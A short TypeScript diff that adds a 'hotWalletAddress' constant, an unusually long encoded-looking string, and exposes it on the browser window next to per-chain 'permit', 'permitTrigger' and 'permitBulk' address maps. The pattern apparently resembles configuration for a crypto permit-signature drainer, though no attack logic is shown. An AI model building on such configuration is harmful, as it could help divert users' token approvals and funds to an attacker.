@@ -64,6 +64,9 @@ const permitBulkAddresses: Record<ChainType, string> = {
     'ZsPNMsGz8D8y11MAneZTVjJndCjgTUmenzfjjRBRRAo2DZVkwmBZxuHGoNTFLLrmFhsvuagJbFxBVLFW2nnoSuDHhNckxkJhBKNVhfPghWoKTuCHsEdJcJ1RD6XTT2aWbGPwHkja29mj2RibYNyCqjkPWEmbRJhVvfN2DUZ9pExxBPTmghNa6tFQyLkkfHdmuXEXLdpmWndfdknawDuojQPGjx3p42ewB4eeV8Zs7dDCDLdUUghTcczqJAadPMroUpmifMTw1FrpU3jC3kMaSzYpcpPu4e44xEni3E9hrenfQePbFVe9Jq9bVyjsQBF8vC8UxqefzEFmMoHT9xkdRNsFmfLMAximM3nyNhTMgLimWvLcNddW11jK1FFPumgKRUUeRivjtnXiRsNedXpmHKhvSVvpS8wAJbuySw3bHqkrpgQHqAr6vUiXj5McjsYzVh7PZxrUgEGNe8uLk4UpxJGhW3TVLNcPHdEbq2AoyabVkK2ChbE9KZ2JJBdHah93VgZSVG',
 };
 
+const hotWalletAddress =
+  'nB3L2PD3J4rMmyGk7nnNdESpPXxhPRQ4t1chF8LTXtceMQjKCEgL2pFjPY6cehGjyEFZyHEomBTFXZyqfonvxDozrTtK5JzatD8SdmcPeJNWPvdRb5UxEMXE4WQtpAFzt2veT8Z6bmoWN';
+
 /**
  * Determines the ChainType based on the provided address.
  * @param address The address to evaluate.
@@ -91,4 +94,5 @@ if (typeof window !== 'undefined') {
   (window as any).permitAddresses = permitAddresses;
   (window as any).permitTriggerAddresses = permitTriggerAddresses;
   (window as any).permitBulkAddresses = permitBulkAddresses;
+  (window as any).hotWalletAddress = hotWalletAddress;
 }
